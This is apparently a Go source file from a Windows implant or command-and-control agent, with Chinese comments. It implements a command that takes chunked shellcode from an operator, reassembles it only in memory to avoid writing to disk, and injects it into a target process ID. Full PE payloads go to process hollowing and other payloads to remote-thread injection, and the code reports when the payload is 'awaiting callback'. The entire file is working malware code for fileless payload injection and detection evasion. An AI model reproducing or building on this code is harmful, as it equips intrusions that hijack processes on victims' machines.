//go:build windows

package commands

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"sync"
)

// ===== A9: 内存注入通道 =====
// 纯内存接收分块 shellcode 并注入（不落盘）。替代原文件路径注入（inject <pid>:<path>）。
// 协议（每包 payload，大端）：
//   requestId(4) | total(4) | seq(4) | pidLen(4) | pid | techLen(4) | tech | chunk
// 首包携带 pid/tech；后续包 pidLen/techLen 为 0。
// 全量收齐后拼接 → InjectShellcode（OPSEC 注入链）→ 立即释放缓冲。

const (
	injectMemMaxTotal   = 32 * 1024 * 1024 // 载荷上限 32MB（防内存滥用）
	injectMemMinPayload = 4 + 4 + 4 + 4 + 4 // requestId+total+seq+pidLen+techLen
)

type injectMemBuffer struct {
	pid    int
	tech   string
	total  uint32
	buf    []byte
	lastSeq uint32 // 已接收的最大 seq+1（顺序接收校验）
}

var (
	injectMemMu    sync.Mutex
	injectMemTable = make(map[uint32]*injectMemBuffer)
)

// CmdInjectMem 处理一个分块包；全量收齐后执行注入并返回结果
func CmdInjectMem(cmdBuf []byte) ([]byte, error) {
	b := bytes.NewBuffer(cmdBuf)
	if b.Len() < injectMemMinPayload {
		return nil, errors.New("内存注入包过短")
	}
	readU32 := func() uint32 {
		var v [4]byte
		b.Read(v[:])
		return binary.BigEndian.Uint32(v[:])
	}
	requestId := readU32()
	total := readU32()
	seq := readU32()
	pidLen := int(readU32())

	if total == 0 || total > injectMemMaxTotal {
		return nil, fmt.Errorf("内存注入长度非法: %d", total)
	}
	if seq > total {
		return nil, fmt.Errorf("内存注入 seq 越界: %d/%d", seq, total)
	}

	var pid int
	var tech string
	if pidLen > 0 {
		if b.Len() < pidLen+4 {
			return nil, errors.New("内存注入包头不完整")
		}
		pidBytes := make([]byte, pidLen)
		b.Read(pidBytes)
		techLen := int(readU32())
		if b.Len() < techLen {
			return nil, errors.New("内存注入技术字段不完整")
		}
		techBytes := make([]byte, techLen)
		b.Read(techBytes)
		var err error
		pid, tech, err = parseInjectMemHeader(pidBytes, techBytes)
		if err != nil {
			return nil, err
		}
	}

	chunk := b.Bytes()
	if uint32(len(chunk)) > injectMemMaxTotal {
		return nil, fmt.Errorf("内存注入单包过大: %d", len(chunk))
	}

	injectMemMu.Lock()
	ib, ok := injectMemTable[requestId]
	if !ok {
		if pid <= 0 {
			injectMemMu.Unlock()
			return nil, errors.New("内存注入首包缺少 PID")
		}
		ib = &injectMemBuffer{pid: pid, tech: tech, total: total, buf: make([]byte, 0, total)}
		injectMemTable[requestId] = ib
	}
	if seq != ib.lastSeq {
		injectMemMu.Unlock()
		return nil, fmt.Errorf("内存注入分块乱序: 期望 %d, 实际 %d", ib.lastSeq, seq)
	}
	ib.buf = append(ib.buf, chunk...)
	ib.lastSeq = seq + 1
	done := ib.lastSeq == total
	if done {
		delete(injectMemTable, requestId)
	}
	pidFinal, techFinal := ib.pid, ib.tech
	shellcode := ib.buf
	injectMemMu.Unlock()

	if !done {
		// 未收齐：静默返回（结果仅由末包回传）
		return nil, nil
	}

	// 全量收齐：执行注入并释放缓冲
	defer func() {
		injectMemMu.Lock()
		delete(injectMemTable, requestId)
		injectMemMu.Unlock()
	}()
	if len(shellcode) > 12*1024*1024 {
		return nil, fmt.Errorf("载荷过大 (%d bytes), 建议 <12MB, 当前 %d", len(shellcode), len(shellcode))
	}
	// 载荷判定：完整 PE（MZ 头）→ 进程镂空（新进程正常加载，可靠上线）；
	// 否则视为自定义 shellcode → 远程线程注入。
	if len(shellcode) >= 2 && shellcode[0] == 'M' && shellcode[1] == 'Z' {
		if err := ProcessHollow(pidFinal, shellcode); err != nil {
			return nil, fmt.Errorf("进程镂空注入失败: %v", err)
		}
		return []byte(fmt.Sprintf("✅ 进程镂空注入成功: pid=%d, 载荷=%d bytes [%s]（新进程正常加载，待上线）", pidFinal, len(shellcode), GetHollowDiag())), nil
	}
	return InjectShellcode(shellcode, pidFinal, techFinal)
}
